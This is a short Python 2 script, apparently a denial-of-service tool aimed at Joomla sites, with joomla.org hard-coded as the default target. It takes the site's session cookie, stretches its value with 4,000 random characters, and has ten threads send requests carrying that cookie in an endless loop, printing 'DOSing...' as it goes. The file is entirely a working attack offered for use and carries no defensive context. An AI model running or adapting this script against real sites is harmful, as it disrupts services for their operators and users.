# -*- coding: utf-8 -*-
__author__ = 'Dave'

import re
import requests
import threadpool as tp
import random

Host = 'http://joomla.org'
#Host = sys.argv[1]

THREAD_NUM = 10
#THREAD_NUM = int(sys.argv[2])

HEADER = {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0'
}

def randomCharacter():
    _RandomChar = random.choice(['0','1','2','3','4','5','6','7','8','9','q','w','e','r','t','y','u','i',
                                 'o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m'])
    return _RandomChar


def exploit(args):
    _Flag = 0
    if Host.startswith('http://'):
        _Host = Host
    else:
        _Host = "http://" + Host


    _Req = requests.session().get(_Host)
    _WebContent = str(_Req.headers)
    _WebTmp = _WebContent.split('; path=/')
    _WebTmp = _WebTmp[0]
    _WebTmp = _WebTmp.split('\'')
    _WebTmp = _WebTmp[len(_WebTmp) - 1]
    _WebTmp = _WebTmp.split('=')
    _SessionID = _WebTmp[0]
    _Session = _WebTmp[1]


    for i in range(4000):
        _Session += randomCharacter()

    _Cookies = {
        _SessionID : _Session
    }

    while True:
        _Flag += 1
        try:
            _Req = requests.get(_Host,cookies=_Cookies,headers=HEADER)
            print "[%s] DOSing... " % _Flag
            print _Req.content
        except:
            continue



if __name__ == '__main__':
    args = []
    for i in range(THREAD_NUM):
        args.append(args)
    pool = tp.ThreadPool(THREAD_NUM)
    reqs = tp.makeRequests(exploit, args)
    [pool.putRequest(req) for req in reqs]
    pool.wait()
